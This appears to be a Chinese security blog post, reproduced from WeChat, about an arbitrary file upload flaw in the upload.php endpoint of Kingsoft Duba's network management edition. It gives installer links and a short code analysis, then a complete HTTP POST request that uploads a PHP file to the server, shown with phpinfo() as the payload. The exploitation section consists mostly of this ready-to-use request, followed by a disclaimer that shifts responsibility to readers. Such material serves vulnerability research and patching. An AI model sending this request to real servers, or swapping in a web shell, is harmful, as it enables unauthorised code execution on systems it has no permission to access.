<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/xdypPRdPurkuAxHzhcN5iw)

**【安装包】**

<table><tbody><tr><td width="68" valign="middle" align="center"><p>V8<br></p></td><td width="492" valign="top"><p>http://duba-011.duba.net/netversion/Package/KAVNETV8Plus.iso</p></td></tr><tr><td width="68" valign="middle" align="center"><p>V9</p></td><td width="511" valign="top">http://duba-011.duba.net/netversion/Package/SecManage.iso</td></tr></tbody></table>

![](https://mmbiz.qpic.cn/mmbiz_png/0ostOF4gwmKGYPcglvHd3NCpB7X3h1ndNuZHvyTSKvolVeZo7JZrmvcGoZEqKJ8WmoKNAvt1kuUMichprvBYMxQ/640?wx_fmt=png)

**【漏洞复现】**

**0x01 代码分析**

读取 server.conf 获取文件上传路径，默认配置下是未配置过的，所以默认使用 UploadDir 路径。

![](https://mmbiz.qpic.cn/mmbiz_png/0ostOF4gwmKGYPcglvHd3NCpB7X3h1ndKR58x14n2gNIALT18zHa3icOaYSNCyKffvG0n8uyZ0ecoAFyRHg19eQ/640?wx_fmt=png)

判断文件名称，长度要求为 32 位，创建 UploadDir 目录，并将文件上传。

![](https://mmbiz.qpic.cn/mmbiz_png/0ostOF4gwmKGYPcglvHd3NCpB7X3h1ndZsxJe7InPLG37cw12O489djQEO8Hv5fEyF250HJ5ZpfCic0PZ3cJQLw/640?wx_fmt=png)

**0x02 漏洞利用**

漏洞 url:  /tools/manage/upload.php

```
POST /tools/manage/upload.php HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------332985667634852910053507734731
Content-Length: 266
Connection: close
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache
-----------------------------332985667634852910053507734731
Content-Disposition: form-data; 
Content-Type: image/png
<?php phpinfo();?>
-----------------------------332985667634852910053507734731--

```

![](https://mmbiz.qpic.cn/mmbiz_png/0ostOF4gwmKGYPcglvHd3NCpB7X3h1nd94veKBhicRicOky6G0FAvYbZTw6RjSDznl7fb6lsXP5vmliaEW7XVkWeg/640?wx_fmt=png)

免责声明由于传播、利用本公众号 MaLoSec 所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号 MaLoSec 及作者不为此承担任何责任，一旦造成后果请自行承担！如有侵权烦请告知，我们会立即删除并致歉。谢谢！

![](https://mmbiz.qpic.cn/mmbiz_png/0ostOF4gwmLGoiaHMOw9kHugI1LV8V9RIX5utaFBbLQm5YazuicqGh5MKare8wXqKl58KPaKkZIwvialtJibbr6yXw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/0ostOF4gwmLGoiaHMOw9kHugI1LV8V9RIhXRNd6ECVRiaGPibgObCrRvPDQI2czuUcYxNmOibYHkrU0zlknrgGwZYg/640?wx_fmt=png)